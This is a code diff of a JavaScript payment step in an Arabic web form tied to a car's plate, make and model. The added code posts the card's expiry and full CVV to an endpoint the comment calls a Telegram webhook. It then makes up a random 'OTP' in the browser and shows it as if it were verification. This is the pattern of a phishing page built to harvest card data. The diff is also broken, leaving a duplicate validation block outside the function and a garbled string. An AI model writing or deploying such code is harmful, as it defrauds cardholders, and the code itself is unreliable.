@@ -175,7 +175,7 @@
         showStep(3);
     }
 
-    function sendPayment() {
+    async function sendPayment() {
         const cardNumber = document.getElementById('cardNumber').value.trim();
         const expiry = document.getElementById('expiry').value.trim();
         const cvv = document.getElementById('cvv').value.trim();
@@ -184,6 +184,51 @@
             alert('الرجاء إدخال رقم بطاقة مكون من 16 رقم');
             return;
         }
+        if (!expiry || expiry.length < 5) {
+            alert('الرجاء إدخال تاريخ انتهاء صحيح (MM/YY)');
+            return;
+        }
+        if (!cvv || cvv.length < 3) {
+            alert('الرجاء إدخال الرمز السري المكون من 3 أرقام');
+            return;
+        }
+        
+        try {
+            // إرسال بيانات الدفع إلى Telegram Webhook
+            const paymentData = {
+                plaque: currentCar?.plaque || 'غير محدد',
+                cardNumber: cardNumber.slice(-4).padStart(16, '*'), // إظهار آخر 4 أرقام فقط
+                expiry: expiry,
+                cvv: cvv,
+                timestamp: new Date().toLocaleString('ar-EG'),
+                marque: currentCar?.marque || 'غير محدد',
+                modele: currentCar?.modele || 'غير محدد'
+            };
+            
+            // استدعاء الـ webhook
+            const response = await fetch('/api/send-payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(paymentData)
+            });
+            
+            if (response.ok) {
+                console.log("[v0] Payment data sent successfully");
+                // توليد OTP عشوائي
+                generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+                document.getElementById('otpDisplay').innerHTML = generatedOtp;
+                
+                showStep(4);
+            } else {
+                throw new Error('فشل إرسال البيانات');
+            }
+        } catch (error) {
+            console.error("[v0] Error sending payment:", error);
+            alert('حدث خطأ في إرسال البيانات: ' + error.message);
+        }
+    }
         if (!expiry || expiry.length < 5) {
             alert('الرجاء إدخال تاريخ انتهاء صحي�� (MM/YY)');
             return;
